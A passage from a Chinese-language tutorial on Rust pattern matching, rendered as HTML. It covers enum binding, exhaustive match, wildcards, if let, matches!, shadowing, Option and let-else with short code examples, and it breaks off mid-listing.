id="模式绑定"><a href="#模式绑定" class="headerlink" title="模式绑定"></a>模式绑定</h5><p>模式匹配的另外一个重要功能是从模式中取出绑定的值，例如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![allow(unused)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">UsState</span> &#123;</span><br><span class="line">    Alabama,</span><br><span class="line">    Alaska,</span><br><span class="line">    <span class="comment">// --snip--</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Coin</span> &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    <span class="title function_ invoke__">Quarter</span>(UsState), <span class="comment">// 25美分硬币</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>Coin::Quarter</code> 成员还存放了一个值：美国的某个州（因为在 1999 年到 2008 年间，美国在 25 美分(Quarter)硬币的背后为 50 个州印刷了不同的标记，其它硬币都没有这样的设计）。</p><p>接下来，我们希望在模式匹配中，获取到 25 美分硬币上刻印的州的名称：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">value_in_cents</span>(coin: Coin) <span class="punctuation">-&gt;</span> <span class="type">u8</span> &#123;</span><br><span class="line">    <span class="keyword">match</span> coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::<span class="title function_ invoke__">Quarter</span>(state) =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);</span><br><span class="line">            <span class="number">25</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，在匹配 <code>Coin::Quarter(state)</code> 模式时，我们把它内部存储的值绑定到了 <code>state</code> 变量上，因此 <code>state</code> 变量就是对应的 <code>UsState</code> 枚举类型。</p><p>例如有一个印了阿拉斯加州标记的 25 分硬币：<code>Coin::Quarter(UsState::Alaska)</code>，它在匹配时，<code>state</code> 变量将被绑定 <code>UsState::Alaska</code> 的枚举值。</p><h5 id="穷尽匹配"><a href="#穷尽匹配" class="headerlink" title="穷尽匹配"></a>穷尽匹配</h5><p>之前说过match的匹配必须穷尽所有情况，下面来距离说明。例如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">    East,</span><br><span class="line">    West,</span><br><span class="line">    North,</span><br><span class="line">    South,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">dire</span> = Direction::South;</span><br><span class="line">    <span class="keyword">match</span> dire &#123;</span><br><span class="line">        Direction::East =&gt; <span class="built_in">println!</span>(<span class="string">&quot;East&quot;</span>),</span><br><span class="line">        Direction::North | Direction::South =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;South or North&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中，我们匹配了East，North，South，但没有匹配West，程序就会报一个错</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error[E0004]: non-exhaustive patterns: `West` not covered <span class="comment">// 非穷尽匹配，`West` 没有被覆盖</span></span><br><span class="line">  -<span class="punctuation">-&gt;</span> src/main.rs:<span class="number">10</span>:<span class="number">11</span></span><br><span class="line">   |</span><br><span class="line"><span class="number">1</span>  | / <span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line"><span class="number">2</span>  | |     East,</span><br><span class="line"><span class="number">3</span>  | |     West,</span><br><span class="line">   | |     ---- not covered</span><br><span class="line"><span class="number">4</span>  | |     North,</span><br><span class="line"><span class="number">5</span>  | |     South,</span><br><span class="line"><span class="number">6</span>  | | &#125;</span><br><span class="line">   | |_- `Direction` defined here</span><br><span class="line">...</span><br><span class="line"><span class="number">10</span> |       <span class="keyword">match</span> dire &#123;</span><br><span class="line">   |             ^^^^ pattern `West` not covered <span class="comment">// 模式 `West` 没有被覆盖</span></span><br><span class="line">   |</span><br><span class="line">   = help: ensure that all possible cases are being handled, possibly by adding wildcards or more <span class="keyword">match</span> arms</span><br><span class="line">   = note: the matched value is of <span class="keyword">type</span> `Direction`</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以我们在写模式匹配时，需要将所有枚举的值都赋上值</p><h5 id="通配符"><a href="#通配符" class="headerlink" title="_通配符"></a>_通配符</h5><p>当我们不想在匹配时列出所有值的时候，可以使用Rust提供的一个特殊模式，例如，<code>u8</code> 可以拥有 0 到 255 的有效的值，但是我们只关心 <code>1、3、5 和 7</code> 这几个值，不想列出其它的 <code>0、2、4、6、8、9 一直到 255</code> 的值。那么, 我们不必一个一个列出所有值, 因为可以使用特殊的模式 <code>_</code> 替代：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">some_u8_value</span> = <span class="number">0u8</span>;</span><br><span class="line"><span class="keyword">match</span> some_u8_value &#123;</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;one&quot;</span>),</span><br><span class="line">    <span class="number">3</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;three&quot;</span>),</span><br><span class="line">    <span class="number">5</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;five&quot;</span>),</span><br><span class="line">    <span class="number">7</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;seven&quot;</span>),</span><br><span class="line">    _ =&gt; (),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通常，将_防止其他分支后，_将会匹配所有遗漏的值。()表示返回单元类型与所有分支返回值的类型相同，所以当匹配到_后，什么也不会发生</p><p>除了_通配符，用一个变量来承载其他情况也是可以的。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">    East,</span><br><span class="line">    West,</span><br><span class="line">    North,</span><br><span class="line">    South,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">dire</span> = Direction::South;</span><br><span class="line">    <span class="keyword">match</span> dire &#123;</span><br><span class="line">        Direction::East =&gt; <span class="built_in">println!</span>(<span class="string">&quot;East&quot;</span>),</span><br><span class="line">        other =&gt; <span class="built_in">println!</span>(<span class="string">&quot;other direction: &#123;:?&#125;&quot;</span>, other),</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而，在某些场景下，我们其实只关心<strong>某一个值是否存在</strong>，此时 <code>match</code> 就显得过于啰嗦。</p><h5 id="if-let匹配"><a href="#if-let匹配" class="headerlink" title="if let匹配"></a>if let匹配</h5><p>在 Rust 中，<code>Some</code> 是 <code>Option</code> 枚举的一个变体。<code>Option</code> 是一个非常常用的枚举类型，它用于表示一个可能存在或不存在的值。<code>Option</code> 有两个变体：</p><ol><li><code>Some(T)</code>：表示一个包含类型 <code>T</code> 的值。<code>Some</code> 用来包装一个具体的值，表示该值存在。</li><li><code>None</code>：表示没有值，也就是值不存在。</li></ol><p>有时候会遇到只有一个模式的值需要被处理，其他值被忽略的情况，如果使用match就要写成一下模式</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">v</span> = <span class="title function_ invoke__">Some</span>(<span class="number">3u8</span>);</span><br><span class="line"><span class="keyword">match</span> v &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(<span class="number">3</span>) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;three&quot;</span>),</span><br><span class="line">    _ =&gt; (),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样写太过于繁冗，我们使用if let的方式来实现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(<span class="number">3</span>) = v &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;three&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="matches-宏"><a href="#matches-宏" class="headerlink" title="matches!宏"></a>matches!宏</h5><p>Rust标准库中提供了一个非常实用的宏：matches!,他可以将一个表达式跟模式进行匹配，然后返回匹配的结果 true or false。</p><p>例如，有一个动态数组，里面存有以下枚举</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">MyEnum</span> &#123;</span><br><span class="line">    Foo,</span><br><span class="line">    Bar</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">v</span> = <span class="built_in">vec!</span>[MyEnum::Foo,MyEnum::Bar,MyEnum::Foo];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在如果想对v进行过滤，只保留类型是MyEnum::Foo的元素，按经验一般来说是这样写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v.iter().filter(|x| x == MyEnum::Foo);</span><br></pre></td></tr></table></figure><p>但是，实际上这行代码会报错，因为你无法将x直接跟一个枚举成员进行比较。我们使用matches!进行比较</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">filter</span>(|x| matches!(x, MyEnum::Foo));</span><br></pre></td></tr></table></figure><p>我们来看看其他例子</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">foo</span> = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line"><span class="built_in">assert!</span>(matches!(foo, <span class="string">&#x27;A&#x27;</span>..=<span class="string">&#x27;Z&#x27;</span> | <span class="string">&#x27;a&#x27;</span>..=<span class="string">&#x27;z&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">bar</span> = <span class="title function_ invoke__">Some</span>(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">assert!</span>(matches!(bar, <span class="title function_ invoke__">Some</span>(x) <span class="keyword">if</span> x &gt; <span class="number">2</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="变量遮蔽"><a href="#变量遮蔽" class="headerlink" title="变量遮蔽"></a>变量遮蔽</h5><p>无论是 <code>match</code> 还是 <code>if let</code>，这里都是一个新的代码块，而且这里的绑定相当于新变量，如果你使用同名变量，会发生变量遮蔽：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">age</span> = <span class="title function_ invoke__">Some</span>(<span class="number">30</span>);</span><br><span class="line">   <span class="built_in">println!</span>(<span class="string">&quot;在匹配前，age是&#123;:?&#125;&quot;</span>,age);</span><br><span class="line">   <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(age) = age &#123;</span><br><span class="line">       <span class="built_in">println!</span>(<span class="string">&quot;匹配出来的age是&#123;&#125;&quot;</span>,age);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">println!</span>(<span class="string">&quot;在匹配后，age是&#123;:?&#125;&quot;</span>,age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cargo run </code>运行后输出如下：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在匹配前，age是Some(30)</span><br><span class="line">匹配出来的age是30</span><br><span class="line">在匹配后，age是Some(30)</span><br></pre></td></tr></table></figure><p>可以看出在 <code>if let</code> 中，<code>=</code> 右边 <code>Some(i32)</code> 类型的 <code>age</code> 被左边 <code>i32</code> 类型的新 <code>age</code> 遮蔽了，该遮蔽一直持续到 <code>if let</code> 语句块的结束。因此第三个 <code>println!</code> 输出的 <code>age</code> 依然是 <code>Some(i32)</code> 类型。</p><p>对于 <code>match</code> 类型也是如此:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">age</span> = <span class="title function_ invoke__">Some</span>(<span class="number">30</span>);</span><br><span class="line">   <span class="built_in">println!</span>(<span class="string">&quot;在匹配前，age是&#123;:?&#125;&quot;</span>,age);</span><br><span class="line">   <span class="keyword">match</span> age &#123;</span><br><span class="line">       <span class="title function_ invoke__">Some</span>(age) =&gt;  <span class="built_in">println!</span>(<span class="string">&quot;匹配出来的age是&#123;&#125;&quot;</span>,age),</span><br><span class="line">       _ =&gt; ()</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">println!</span>(<span class="string">&quot;在匹配后，age是&#123;:?&#125;&quot;</span>,age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，**<code>match</code> 中的变量遮蔽其实不是那么的容易看出**，因此要小心！其实这里最好不要使用同名，避免难以理解</p><h4 id="解构Option"><a href="#解构Option" class="headerlink" title="解构Option"></a>解构Option</h4><p>定义：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Option</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(T),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单解释就是，应该变量要么有值：Some(T),要么为空：None.</p><p>那现在我们该如何去使用这个Option枚举类型，根据经验，可以通过match来实现</p><blockquote><p>因为 <code>Option</code>，<code>Some</code>，<code>None</code> 都包含在 <code>prelude</code> 中，因此你可以直接通过名称来使用它们，而无需以 <code>Option::Some</code> 这种形式去使用，总之，千万不要因为调用路径变短了，就忘记 <code>Some</code> 和 <code>None</code> 也是 <code>Option</code> 底下的枚举成员！</p></blockquote><h5 id="匹配Option"><a href="#匹配Option" class="headerlink" title="匹配Option&lt;T&gt;"></a>匹配Option&lt;T&gt;</h5><p>使用<code>Option&lt;T&gt;</code>,是为了从Some中取出起内部的T值以及处理没有值的情况，为了演示这一点，下面编写一个函数，它获取一个<code>Option&lt;i32&gt;</code>,如果其中含有一个值，将其加一；如果其中没有值，则返回<code>None</code>值；</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">plus_one</span>(x: <span class="type">Option</span>&lt;<span class="type">i32</span>&gt;) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">i32</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> x &#123;</span><br><span class="line">        <span class="literal">None</span> =&gt; <span class="literal">None</span>,</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(i) =&gt; <span class="title function_ invoke__">Some</span>(i + <span class="number">1</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">five</span> = <span class="title function_ invoke__">Some</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">six</span> = <span class="title function_ invoke__">plus_one</span>(five);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">none</span> = <span class="title function_ invoke__">plus_one</span>(<span class="literal">None</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>plus_one</code>接受一个<code>Option&lt;i32&gt;</code>类型的参数，提示返回一个<code>Option&lt;i32&gt;</code>类型的值（这种形式的函数在标准库类随处可见），在该函数的内部处理中，如果传入的是一个None，则返回一个None且不做任何处理；如果传入的是一个Some(i32)，则通过模式绑定，把其中的值绑定到变量i上，然后返回i+1的值，同时用Some进行包裹</p><p>当传入Some(5)时，首先匹配None分支，由于值不满足，继续匹配下一个分支：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Some(i) =&gt; Some(i + 1)</span><br></pre></td></tr></table></figure><p>Some(5)与Some(i)匹配上了，i绑定了Some包含的值，因此i在这里i的值为5，接着匹配分支的代码被执行，最后将i的值加一并返回一个含有值6的新Some。</p><p>当传入None时，直接就匹配到了match的第一个分支，后续分支将不再匹配</p><h4 id="模式匹配适用场景"><a href="#模式匹配适用场景" class="headerlink" title="模式匹配适用场景"></a>模式匹配适用场景</h4><h5 id="match分支"><a href="#match分支" class="headerlink" title="match分支"></a>match分支</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> VALUE &#123;</span><br><span class="line">    PATTERN =&gt; EXPRESSION,</span><br><span class="line">    PATTERN =&gt; EXPRESSION,</span><br><span class="line">    PATTERN =&gt; EXPRESSION,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上所示，match的每一个分支就是一个模式，因为match是无穷尽，因此我们需要一个<code>_</code>通配符来匹配剩余所有情况：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> VALUE &#123;</span><br><span class="line">    PATTERN =&gt; EXPRESSION,</span><br><span class="line">    PATTERN =&gt; EXPRESSION,</span><br><span class="line">    _ =&gt; EXPRESSION,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="if-let分支"><a href="#if-let分支" class="headerlink" title="if let分支"></a>if let分支</h5><p>if let 分支往往用于匹配一个模式，而忽略剩下所有模式的场景：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">PATTERN</span> = SOME_VALUE &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="while-let条件循环"><a href="#while-let条件循环" class="headerlink" title="while let条件循环"></a>while let条件循环</h5><p>它只允许条件满足，模式匹配就能一直进行while循环。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![allow(unused)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"><span class="comment">// Vec是动态数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stack</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向数组尾部插入元素</span></span><br><span class="line">stack.<span class="title function_ invoke__">push</span>(<span class="number">1</span>);</span><br><span class="line">stack.<span class="title function_ invoke__">push</span>(<span class="number">2</span>);</span><br><span class="line">stack.<span class="title function_ invoke__">push</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stack.pop从数组尾部弹出元素</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(top) = stack.<span class="title function_ invoke__">pop</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, top);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">v</span> = <span class="built_in">vec!</span>[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (index, value) <span class="keyword">in</span> v.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; is at index &#123;&#125;&quot;</span>, value, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里使用enumerate方法生成了一个迭代器，该迭代器每次迭代都会返回一个（索引，值）形式的元组，然后用（index，value）来匹配</p><h5 id="let语句"><a href="#let语句" class="headerlink" title="let语句"></a>let语句</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">PATTERN</span> = EXPRESSION;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该语句也是一种模式匹配</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>这其中，x是一种模式绑定，代表将<strong>匹配的值绑定到变量</strong>上，因此，在Rust中，变量名也是一种模式，只不过它比较朴素很不起眼罢了</p><h5 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h5><p>函数参数也是模式：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">foo</span>(x: <span class="type">i32</span>) &#123;</span><br><span class="line">    <span class="comment">// 代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中x就是一个模式，你还可以在参数中匹配元组：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_coordinates</span>(&amp;(x, y): &amp;(<span class="type">i32</span>, <span class="type">i32</span>)) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Current location: (&#123;&#125;, &#123;&#125;)&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">point</span> = (<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_coordinates</span>(&amp;point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&amp;(3,5)会匹配模式&amp;(x,y)，因此x得到了3，y得到了5</p><h5 id="let和if-let"><a href="#let和if-let" class="headerlink" title="let和if let"></a>let和if let</h5><p>对于以下代码，编译器会报错：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">Some</span>(x) = some_option_value;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为右边的值可能不为<code>Some</code>，而是<code>None</code>，这种时候就不能进行匹配，也就是上面的代码遗漏<code>None</code>的匹配</p><p>类似<code>let，for和match</code>都必须要求完全覆盖匹配，才能通过编译(不可驳模式匹配)</p><p>但是对于if let，就可以这样使用:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(x) = some_option_value&#123;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为if let允许匹配一种模式，而忽略区域的模式(可驳模式匹配)。</p><h5 id="let-else-Rust-1-65-新增"><a href="#let-else-Rust-1-65-新增" class="headerlink" title="let-else(Rust 1.65 新增)"></a>let-else(Rust 1.65 新增)</h5><p>使用 <code>let-else</code> 匹配，即可使 <code>let</code> 变为可驳模式。它可以使用 <code>else</code> 分支来处理模式不匹配的情况，但是 <code>else</code> 分支中必须用发散的代码块处理（例如：<code>break</code>、<code>return</code>、<code>panic</code>）</p><h4 id="全模式列表（总结）"><a href="#全模式列表（总结）" class="headerlink" title="全模式列表（总结）"></a>全模式列表（总结）</h4><p>由于不同类型的模式匹配的例子比较多，为了方便查询，总结一下</p><h5 id="匹配字面值"><a href="#匹配字面值" class="headerlink" title="匹配字面值"></a>匹配字面值</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 